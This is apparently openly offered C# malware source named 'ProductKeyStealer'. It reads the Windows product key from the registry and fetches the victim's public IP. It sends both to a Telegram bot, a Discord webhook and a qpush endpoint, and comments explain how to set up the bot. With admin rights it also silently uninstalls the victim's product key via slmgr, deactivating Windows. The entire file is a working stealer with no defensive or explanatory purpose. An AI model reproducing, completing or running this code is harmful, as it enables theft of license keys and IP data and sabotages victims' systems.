using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Security.Principal;

namespace ProductKeyStealer
{
    class Program
    {
        public static void Main()
        {
            using (var client = new WebClient())
            {
                string telegrambottoken = ""; //Message @BotFather to get a bot token
                string telegramchatid = ""; //Message @getidsbot to get your chat id
                string telegramtext = $"New key!\n{WinProdKeyFind.KeyDecoder.GetWindowsProductKeyFromRegistry()}\nIP: {client.DownloadString("https://api.ipify.org")}";
                string telegrambot = $"https://api.telegram.org/bot{telegrambottoken}/sendMessage?chat_id={telegramchatid}&text={telegramtext}";

                string discordwebhook = "";
                Dictionary<string, string> discordmessage = new Dictionary<string, string> { { "content", $"New key!\n{WinProdKeyFind.KeyDecoder.GetWindowsProductKeyFromRegistry()}\nIP: {client.DownloadString("https://api.ipify.org")}" }, { "username", "KeyStealer" } };

                string qpushname = "";
                string qpushcode = "";
                Dictionary<string, string> qpushmessage = new Dictionary<string, string> { { "name", qpushname }, { "code", qpushcode }, { "msg[text]", $"New key!\n{WinProdKeyFind.KeyDecoder.GetWindowsProductKeyFromRegistry()}\nIP: {client.DownloadString("https://api.ipify.org")}" } };
                HttpClient httpclient = new HttpClient();

                if (telegrambottoken.Length != 0)
                {
                    if (telegramchatid.Length != 0)
                    {
                        httpclient.PostAsync(telegrambot, null).GetAwaiter().GetResult();
                    }
                }
                if (discordwebhook.Length != 0)
                {
                    httpclient.PostAsync(discordwebhook, new FormUrlEncodedContent(discordmessage)).GetAwaiter().GetResult();
                }
                if (qpushname.Length != 0)
                {
                    if (qpushcode.Length != 0)
                    {
                        httpclient.PostAsync("https://qpush.me/pusher/push_site/", new FormUrlEncodedContent(qpushmessage)).GetAwaiter().GetResult();
                    }
                }
                if (IsAdministrator())
                {
                    Process.Start("slmgr.vbs", "//b /upk");
                }
            }
        }
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
    }
}
